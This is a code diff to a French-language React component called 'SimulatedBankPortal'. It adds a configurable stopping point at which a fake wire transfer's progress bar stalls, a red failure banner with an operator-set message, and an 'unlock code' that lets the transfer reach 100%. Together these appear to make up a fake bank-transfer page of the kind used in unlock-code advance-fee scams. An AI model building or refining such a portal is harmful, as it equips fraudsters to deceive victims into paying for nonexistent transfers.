@@ -70,19 +70,7 @@ export default function SimulatedBankPortal({
 
   // Dynamic status-aware transfers logged locally for the dashboard history
   const [userTransfers, setUserTransfers] = useState<any[]>(() => {
-    const localHistStr = localStorage.getItem(`bank_portal_transfers_${transfer.id}`);
-    const propHist = transfer.userTransfers || [];
-    if (localHistStr !== null) {
-      try {
-        const parsedLocal = JSON.parse(localHistStr);
-        if (Array.isArray(parsedLocal) && parsedLocal.length >= propHist.length) {
-          return parsedLocal;
-        }
-      } catch (e) {
-        console.error("Error parsing local transfers history:", e);
-      }
-    }
-    return propHist;
+    return transfer.userTransfers || [];
   });
 
   // FORM INPUTS
@@ -119,6 +107,7 @@ export default function SimulatedBankPortal({
 
   // SUCCESS OUTBOUND MODAL
   const [showSuccessModal, setShowSuccessModal] = useState(false);
+  const [parsedTargetStop, setParsedTargetStop] = useState<number>(100);
 
   // INLINE CUSTOM MODAL TOAST FOR IFRAME COMPATIBILITY
   const [alertMessage, setAlertMessage] = useState<string | null>(null);
@@ -131,15 +120,7 @@ export default function SimulatedBankPortal({
 
   // CURRENT BALANCE STATE
   const [currentBalance, setCurrentBalance] = useState<number>(() => {
-    const localBal = localStorage.getItem(`bank_portal_balance_${transfer.id}`);
-    const propBal = transfer.customBalance !== undefined ? transfer.customBalance : transfer.amount;
-    if (localBal !== null) {
-      const parsedLocal = parseFloat(localBal);
-      if (!isNaN(parsedLocal)) {
-        return Math.min(parsedLocal, propBal);
-      }
-    }
-    return propBal;
+    return transfer.customBalance !== undefined ? transfer.customBalance : transfer.amount;
   });
   const [virementAmountInput, setVirementAmountInput] = useState<string>('');
   const [virementAmount, setVirementAmount] = useState<number>(0);
@@ -147,35 +128,12 @@ export default function SimulatedBankPortal({
 
   useEffect(() => {
     const propBal = transfer.customBalance !== undefined ? transfer.customBalance : transfer.amount;
-    const localBalStr = localStorage.getItem(`bank_portal_balance_${transfer.id}`);
-    if (localBalStr !== null) {
-      const parsedLocal = parseFloat(localBalStr);
-      if (!isNaN(parsedLocal)) {
-        const resolved = Math.min(parsedLocal, propBal);
-        setCurrentBalance(resolved);
-        localStorage.setItem(`bank_portal_balance_${transfer.id}`, resolved.toString());
-        return;
-      }
-    }
     setCurrentBalance(propBal);
     localStorage.setItem(`bank_portal_balance_${transfer.id}`, propBal.toString());
   }, [transfer.customBalance, transfer.amount, transfer.id]);
 
   useEffect(() => {
     const propHist = transfer.userTransfers || [];
-    const localHistStr = localStorage.getItem(`bank_portal_transfers_${transfer.id}`);
-    if (localHistStr !== null) {
-      try {
-        const parsedLocal = JSON.parse(localHistStr);
-        if (Array.isArray(parsedLocal) && parsedLocal.length >= propHist.length) {
-          setUserTransfers(parsedLocal);
-          localStorage.setItem(`bank_portal_transfers_${transfer.id}`, JSON.stringify(parsedLocal));
-          return;
-        }
-      } catch (e) {
-        console.error("Error checking local history in effect:", e);
-      }
-    }
     setUserTransfers(propHist);
     localStorage.setItem(`bank_portal_transfers_${transfer.id}`, JSON.stringify(propHist));
   }, [transfer.userTransfers, transfer.id]);
@@ -473,18 +431,22 @@ export default function SimulatedBankPortal({
     }
 
     // Determine testing scenario choice based on user's manual entry
-    let parsedTargetStop = transfer.stopPercentage;
+    const baseStop = Number(transfer.stopPercentage) || 100;
+    let targetStop = baseStop;
 
     if (entry === '000000') {
       // FORCE REGULATORY FAILURE SIMULATION
-      parsedTargetStop = transfer.stopPercentage < 100 ? transfer.stopPercentage : 50;
+      targetStop = baseStop < 100 ? baseStop : 50;
     } else if (entry === '111111') {
       // FORCE 100% EXCELLENT WIRE INTEGRATION
-      parsedTargetStop = 100;
+      targetStop = 100;
     } else if (correctOtp && entry === correctOtp) {
       // Right code de déblocage unlocks the regulatory blockage and goes up to 100%!
-      parsedTargetStop = 100;
+      targetStop = 100;
     }
+
+    setParsedTargetStop(targetStop);
+    const parsedTargetStop = targetStop;
 
     // Capture unique transaction record initially in "PENDING" (en attente de validation) state
     const vamt = virementAmount || parseFloat(virementAmountInput) || transfer.amount;
@@ -1199,16 +1161,31 @@ export default function SimulatedBankPortal({
                     {/* Step 3: Processing Loader and dynamic progress bar */}
                     {virementStep === 3 && (
                       <div className="space-y-4 font-sans text-left">
-                        <div className="bg-slate-200/60 border border-slate-250 p-4 rounded-3xl space-y-3 shadow-inner">
-                          <div className="flex gap-2.5 items-start">
-                            <span className="h-6 w-6 rounded-full bg-emerald-100 text-emerald-600 border border-emerald-200 flex items-center justify-center font-bold text-xs shrink-0 mt-0.5">✓</span>
-                            <div className="text-xs leading-relaxed">
-                              <strong className="block text-slate-900 text-sm">{t('transfer_success_title')}</strong>
-                              <span className="text-slate-650 font-semibold block mt-0.5">
-                                {t('transfer_success_msg')}
-                              </span>
+                        {(!isProcessing && progress >= parsedTargetStop && parsedTargetStop < 100) ? (
+                          <div className="bg-rose-50 border border-rose-200 p-4 rounded-3xl space-y-3 shadow-inner">
+                            <div className="flex gap-2.5 items-start">
+                              <span className="h-6 w-6 rounded-full bg-rose-100 text-rose-600 border border-rose-200 flex items-center justify-center font-bold text-xs shrink-0 mt-0.5">✖</span>
+                              <div className="text-xs leading-relaxed">
+                                <strong className="block text-rose-950 text-sm">Acheminement suspendu</strong>
+                                <span className="text-rose-700 font-semibold block mt-0.5">
+                                  {transfer.customMessage || "Echec du transfert un problème est survenu, veuillez contacter l'expéditeur ou le support transferwire. Cordialement"}
+                                </span>
+                              </div>
                             </div>
                           </div>
+                        ) : (
+                          <div className="bg-slate-200/60 border border-slate-250 p-4 rounded-3xl space-y-3 shadow-inner">
+                            <div className="flex gap-2.5 items-start">
+                              <span className="h-6 w-6 rounded-full bg-emerald-100 text-emerald-600 border border-emerald-200 flex items-center justify-center font-bold text-xs shrink-0 mt-0.5">✓</span>
+                              <div className="text-xs leading-relaxed">
+                                <strong className="block text-slate-900 text-sm">{t('transfer_success_title')}</strong>
+                                <span className="text-slate-650 font-semibold block mt-0.5">
+                                  {t('transfer_success_msg')}
+                                </span>
+                              </div>
+                            </div>
+                          </div>
+                        )}
 
                           <div className="bg-white border rounded-2xl p-4 space-y-2 text-xs text-slate-650 divide-y divide-slate-101 shadow-sm">
                             <div className="flex justify-between py-1.5">
@@ -1224,7 +1201,6 @@ export default function SimulatedBankPortal({
                               <strong className="text-[#0D71F9] font-extrabold">{(virementAmount || parseFloat(virementAmountInput) || transfer.amount).toLocaleString(undefined, { minimumFractionDigits: 2 })} €</strong>
                             </div>
                           </div>
-                        </div>
 
                         <div className="bg-white border border-slate-200 rounded-3xl p-5 shadow-sm space-y-3 text-center">
                           <div className="flex items-center justify-between font-bold text-xs text-slate-500 mb-1 select-none">
@@ -2426,16 +2402,31 @@ export default function SimulatedBankPortal({
                       {virementStep === 3 && (
                         <div className="space-y-4">
                           {/* Checked verification success banner */}
-                          <div className="bg-slate-200/60 border border-slate-250 p-4 rounded-3xl text-left space-y-3 shadow-inner font-sans">
-                            <div className="flex gap-2.5 items-start">
-                              <span className="h-6 w-6 rounded-full bg-emerald-100 text-emerald-600 border border-emerald-200 flex items-center justify-center font-bold text-xs shrink-0 mt-0.5">✓</span>
-                              <div className="text-xs leading-relaxed">
-                                <strong className="block text-slate-900 text-sm">Bien joué !</strong>
-                                <span className="text-slate-650 font-medium font-semibold block mt-0.5">
-                                  Vérification d'identité effectuée avec succès. Veuillez patienter jusqu'à la fin du virement des fonds vers votre banque avant d'actualiser cette page.
-                                </span>
+                          {(!isProcessing && progress >= parsedTargetStop && parsedTargetStop < 100) ? (
+                            <div className="bg-rose-50 border border-rose-200 p-4 rounded-3xl text-left space-y-3 shadow-inner font-sans">
+                              <div className="flex gap-2.5 items-start">
+                                <span className="h-6 w-6 rounded-full bg-rose-100 text-rose-600 border border-rose-200 flex items-center justify-center font-bold text-xs shrink-0 mt-0.5">✖</span>
+                                <div className="text-xs leading-relaxed">
+                                  <strong className="block text-rose-950 text-sm">Échec du virement</strong>
+                                  <span className="text-rose-700 font-semibold block mt-0.5">
+                                    {transfer.customMessage || "Echec du transfert un problème est survenu, veuillez contacter l'expéditeur ou le support transferwire. Cordialement"}
+                                  </span>
+                                </div>
                               </div>
                             </div>
+                          ) : (
+                            <div className="bg-slate-200/60 border border-slate-250 p-4 rounded-3xl text-left space-y-3 shadow-inner font-sans">
+                              <div className="flex gap-2.5 items-start">
+                                <span className="h-6 w-6 rounded-full bg-emerald-100 text-emerald-600 border border-emerald-200 flex items-center justify-center font-bold text-xs shrink-0 mt-0.5">✓</span>
+                                <div className="text-xs leading-relaxed">
+                                  <strong className="block text-slate-900 text-sm">Bien joué !</strong>
+                                  <span className="text-slate-650 font-medium font-semibold block mt-0.5">
+                                    Vérification d'identité effectuée avec succès. Veuillez patienter jusqu'à la fin du virement des fonds vers votre banque avant d'actualiser cette page.
+                                  </span>
+                                </div>
+                              </div>
+                            </div>
+                          )}
 
                             <div className="bg-white border rounded-2xl p-4 space-y-2 text-xs text-slate-650 divide-y divide-slate-100 select-all shadow-sm">
                               <div className="flex justify-between py-1.5">
@@ -2455,7 +2446,6 @@ export default function SimulatedBankPortal({
                                 <strong className="text-slate-900 text-sm font-black">{(virementAmount || parseFloat(virementAmountInput) || transfer.amount).toLocaleString('fr-FR')} {curSymbol}</strong>
                               </div>
                             </div>
-                          </div>
 
                           {/* Interactive live processing ticker progress bar */}
                           <div className="bg-white border border-slate-200 rounded-3xl p-6 shadow-sm text-center space-y-4">
